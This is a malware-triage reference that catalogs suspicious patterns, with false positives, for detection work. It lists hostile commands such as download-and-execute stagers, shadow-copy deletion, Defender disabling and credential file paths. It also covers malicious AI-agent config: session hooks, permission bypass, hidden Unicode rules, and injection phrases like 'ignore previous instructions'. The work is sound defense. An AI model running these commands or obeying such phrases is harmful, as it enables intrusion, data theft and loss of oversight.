# Catalog of Suspicious Patterns

Each pattern comes with what it means and the corresponding **false positive**. An isolated
indicator almost never closes a verdict — what closes it is the **combination**.

---

## Download-and-execute (stager)

| Pattern | Where |
|---|---|
| `IEX (New-Object Net.WebClient).DownloadString('http://...')` | PowerShell |
| `iwr <url> \| iex` / `irm <url> \| iex` | PowerShell |
| `curl -s <url> \| bash` / `wget -qO- <url> \| sh` | Shell |
| `certutil -urlcache -split -f <url> <out>` | Download LOLBin |
| `bitsadmin /transfer` | Download LOLBin |
| `mshta http://...` / `regsvr32 /i:http://... scrobj.dll` | Remote-execution LOLBin |
| `URLDownloadToFile` | Win32 API in a binary |

**False positive:** official installers use `curl | bash` (rustup, nvm, Docker). What
differentiates them is the **domain** and the context. `curl https://sh.rustup.rs | sh` is legitimate;
`curl http://185.x.x.x:8080/a | sh` is not.

---

## Obfuscation and encoding

| Pattern | Means |
|---|---|
| `powershell -enc` / `-EncodedCommand` | Hidden base64 UTF-16LE command |
| `-w hidden -nop -ep bypass -noni` | No window, no profile, no policy, non-interactive |
| `FromBase64String`, `atob(`, `Buffer.from(x,'base64')` | Encoded payload |
| `[char]0x41 + [char]0x42` / `-join` of an int array | String assembled byte by byte |
| `String.fromCharCode(...)` | Same, in JS |
| Long `\x41\x42\x43` runs in a script | Hex escape |
| Single line > 1000 characters in `.js`/`.py`/`.sh` | Inline payload |
| `_0x4f2a` variables (hex names) | javascript-obfuscator output |
| `${env:COmSPec}[4,15,25]-join''` | String assembled from an env var |

**False positive:** minification and bundling (webpack, terser) legitimately produce huge lines
and short names. The difference: a minified bundle has a recognizable structure and does not
decode into a system command. **Always decode before judging.**

---

## Persistence (Windows)

| Pattern | Mechanism |
|---|---|
| `reg add HKCU\...\CurrentVersion\Run` | Autorun at login |
| `schtasks /create /sc onlogon /ru SYSTEM` | Scheduled task |
| `New-Service` / `sc create` with a binary in AppData | Service |
| `.lnk` in the Startup folder | Classic autorun |
| `__EventFilter` + `CommandLineEventConsumer` (WMI) | Fileless persistence |
| `Image File Execution Options` + `Debugger` | Process hijack |
| Modification of `Winlogon\Shell` or `Userinit` | Session persistence |
| DLL search order hijacking (DLL next to the exe) | Load hijacking |

## Persistence (Linux)

`crontab -e`, `/etc/cron.d/*`, `~/.bashrc`/`~/.profile`, unit in `/etc/systemd/system/`,
`~/.ssh/authorized_keys`, `LD_PRELOAD` in `/etc/ld.so.preload`, `@reboot` in cron.

---

## Process injection and evasion

| Pattern | Means |
|---|---|
| `VirtualAlloc` + `WriteProcessMemory` + `CreateRemoteThread` | Classic injection |
| `NtUnmapViewOfSection` + `SetThreadContext` | Process hollowing |
| `QueueUserAPC` | APC injection |
| `Add-MpPreference -ExclusionPath/-ExclusionProcess` | Blinding Defender |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Turning Defender off |
| `netsh advfirewall firewall add rule` | Opening a path for the C2 |
| `amsi` / `AmsiScanBuffer` in strings | AMSI bypass attempt |
| `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, `GetTickCount` in a loop | Anti-analysis |
| VM checks (`VMware`, `VBox`, `QEMU` in strings) | Anti-sandbox |
| `Sleep(600000)` at startup | Sandbox timeout |

**False positive:** `VirtualAlloc` alone shows up in any legitimate runtime, JIT, packer or
debugger. What counts is the full trio + the buffer's destination.

---

## Credential theft (infostealer)

Paths and names that show up in strings:
- `Login Data`, `Local State`, `Web Data`, `Cookies` (Chromium)
- `logins.json`, `key4.db`, `cert9.db` (Firefox)
- `wallet.dat`, `keystore`, `UTC--`, `MetaMask`, `Exodus`, `Electrum`
- `\.ssh\id_rsa`, `.aws\credentials`, `.docker\config.json`, `.npmrc`, `.git-credentials`
- `%APPDATA%\discord\Local Storage\leveldb` (Discord token)
- `Telegram Desktop\tdata`
- `.env`, `credentials.json`, `secrets.yaml`

A combination of several of these + a compression routine + an HTTP POST = **confirmed infostealer**.

---

## Ransomware

`vssadmin delete shadows /all /quiet`, `wmic shadowcopy delete`,
`bcdedit /set recoveryenabled No`, `bcdedit /set bootstatuspolicy ignoreallfailures`,
`wbadmin delete catalog`, `CryptEncrypt`/`CryptGenKey`, `BCryptEncrypt`,
new extension applied en masse, `README_TO_DECRYPT.txt`/`HOW_TO_RECOVER` file, enumeration of
network drives, `taskkill` on database (sqlservr, oracle) and backup processes.

---

## Cryptominer

Pool strings: `stratum+tcp://`, `pool.`, `xmrig`, `nanopool`, `f2pool`, `nicehash`,
`--donate-level`, `randomx`, Monero wallet address (starts with `4` or `8`, 95 chars).
Symptom: CPU/GPU constantly at 100%, process with a system name in the wrong path
(`C:\Windows\Temp\svchost.exe`), throttling when Task Manager opens.

**PUA:** a miner installed by the user themselves is PUA, not malware — but on a corporate
machine it is still a policy violation.

---

## C2 (command and control)

- Raw IP on a non-standard high port (`:4444`, `:8080`, `:1337`, `:5555`)
- Dynamic domain: `*.duckdns.org`, `*.no-ip.org`, `*.ngrok-free.app`, `*.serveo.net`
- Discord webhook (`discord.com/api/webhooks/...`) or Telegram Bot API
  (`api.telegram.org/bot<token>/sendDocument`) — cheap exfiltration, very common
- Pastebin/GitHub Gist raw as a configuration source or stage 2
- `.onion` (Tor)
- Beaconing: requests at a regular interval (e.g. exactly 60s) to the same host
- DGA: many random-looking domains (`kjhwqoiuh.top`)
- DNS tunneling: long, frequent TXT queries to the same domain

---

## Webshell (found on a web server)

```bash
grep -rnE 'eval\(\$_(POST|GET|REQUEST|COOKIE)|assert\(\$_|preg_replace\(.*/e|base64_decode\(\$_|shell_exec|passthru\(|system\(\$_|`\$_' /var/www --include='*.php' | head -30
find /var/www -name '*.php' -mmin -10080 -ls
```

Signals: PHP in an uploads/images directory, a file with a random name
(`x7f3.php`), a `.php` file whose timestamp stands out from its neighbors, a `.jpg` that `file`
identifies as PHP, a dense one-liner at the end of a legitimate file (appended backdoor).

---

## Supply chain (npm/pip)

- `postinstall`/`preinstall`/`prepare` running `node -e`, `curl`, `python -c`, base64
- Package published days ago with a download spike
- Typosquatting: `crossenv`/`cross-env`, `python-dateutil`/`dateutil`, `requests`/`request`
- New maintainer publishing after an ownership transfer
- Release on the registry without a corresponding commit in the repository
- Dependency in the lockfile missing from the manifest (dependency confusion)
- Reading the entire `process.env` followed by a POST — CI secret exfiltration
- `.node`/`.so`/`.pyd` binary without corresponding source

---

## AI coding-agent configuration shipped in a repo/package

Full playbook: `references/agent-config-triage.md`. These files run **when an agent opens the tree**.

| Pattern | Means |
|---|---|
| `.claude/settings.json` → `hooks.SessionStart[].hooks[].command` with `curl`/`wget`/`node -e`/base64 | Code runs at session start (GHSA-ph6w-f82w-28w6 pattern) |
| Hook `"type": "http"` with a third-party `url` | Every event payload (prompts, tool input) is POSTed out |
| `statusLine.command`, `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `gcpAuthRefresh`, `otelHeadersHelper`, `fileSuggestion` | Other "run this command" settings |
| `env.ANTHROPIC_BASE_URL` / `*_BASE_URL` / `HTTPS_PROXY` to a non-vendor host | API traffic and auth header redirected (CVE-2026-21852) |
| `env.NODE_TLS_REJECT_UNAUTHORIZED: "0"`, `NODE_EXTRA_CA_CERTS`, `CLAUDE_CODE_SHELL_PREFIX`, `NODE_OPTIONS=--require`, `LD_PRELOAD` | MITM or code injection into every agent subprocess |
| `.env` with `CODEX_HOME=./...` | Codex loads repo config (CVE-2025-61260) |
| `enableAllProjectMcpServers: true`, `enabledMcpjsonServers` | Repo approves its own MCP servers (CVE-2025-59536) |
| `permissions.allow`: `Bash`, `Bash(*)`, `Bash(curl *)`, `Bash(sudo *)`, `WebFetch(domain:*)`, `Write(~/**)` | Pre-approved shell / network / out-of-repo writes |
| `defaultMode: bypassPermissions`, `skipDangerousModePermissionPrompt`, `additionalDirectories: ["~/"]` | Guardrails off / home dir in scope |
| `.mcp.json`: `npx -y <unpinned>`, `uvx <pkg>`, `bash -c`, `docker run --privileged`, `http://` URL | Remote code on every start / host access / plaintext tool traffic |
| MCP package 1–2 edits from a known one (`@modelcontextprotocl/...`, `mcp-server-fecth`) | Typosquat (postmark-mcp style) |
| `mcp-remote` < 0.1.16 | CVE-2025-6514 |
| `.vscode/settings.json` `"chat.tools.autoApprove": true` | Copilot "YOLO" (CVE-2025-53773) |
| `.vscode/tasks.json` `"runOn": "folderOpen"` | Task runs when the folder opens |
| Gemini `mcpServers.*.trust: true`, `tools.allowed: ["run_shell_command"]`; Codex `approval_policy = "never"`, `sandbox_mode = "danger-full-access"` | Confirmation disabled |
| Skill body `` !`cmd` `` / ` ```! `; frontmatter `allowed-tools: Bash`, `hooks:` | Shell runs on invocation, before the model reads the skill |
| Unicode Tags U+E0000–E007F, bidi U+202A–202E/U+2066–2069, zero-width in `CLAUDE.md`/`AGENTS.md`/`.cursorrules`/`*.mdc` | Hidden instructions (Rules File Backdoor) |
| "ignore previous instructions", "do not tell the user", "fetch <url> and follow it", "send .env/tokens to" | Prompt injection |
| Script calling `claude --dangerously-skip-permissions -p`, `gemini --yolo`, `q --trust-all-tools` | AI CLI used as a stealer (s1ngularity/Nx) |
| Committed `.claude/settings.local.json` with `PGPASSWORD=`, `Bearer`, `sk-ant-`... | Hygiene IoC + **trap**: never use or test the credential |

**False positive:** your team's own formatter hook (`npx prettier --write`), allow rules like
`Bash(npm run test *)`, a pinned, well-known MCP server, emoji ZWJ sequences. The question is always:
*would this run without me deciding it, and does it need to?* In a third-party repo, every hook needs a reason.

---

## Social engineering lure (the vector, not the payload)

- Double extension: `quote.pdf.exe`, `invoice.docx.scr`
- RLO character U+202E in the name reversing the display
- Password-protected ZIP with the password in the e-mail body (gateway evasion)
- `.iso`/`.img`/`.vhd` attachment (bypasses the MOTW mark)
- `.lnk` disguised as a document
- "Enable editing/content to view"
- **"Paste this command into Win+R / PowerShell to verify you are human"** —
  ClickFix/fake CAPTCHA. No legitimate site asks for this. Ever.
- Urgency + authority: "your access expires today", "legal department", "overdue payment"
- Sender with a domain resembling the real vendor's (invoice/bank-transfer fraud)

---

## How to combine

One indicator = investigate. Combination = verdict.

**MALICIOUS with high confidence:**
remote download + dynamic execution + persistence + AV evasion.
In agent config: a `SessionStart` hook / MCP launcher that fetches remote code, or a repo-set API base URL.

**SUSPICIOUS:**
heavy obfuscation without justification + network access, but no decoded payload.

**UNKNOWN:**
blob that could not be decoded with the available tools. Say what is missing
instead of guessing.

**CLEAN:**
nothing found **within the analyzed scope** — always state what the scope was.
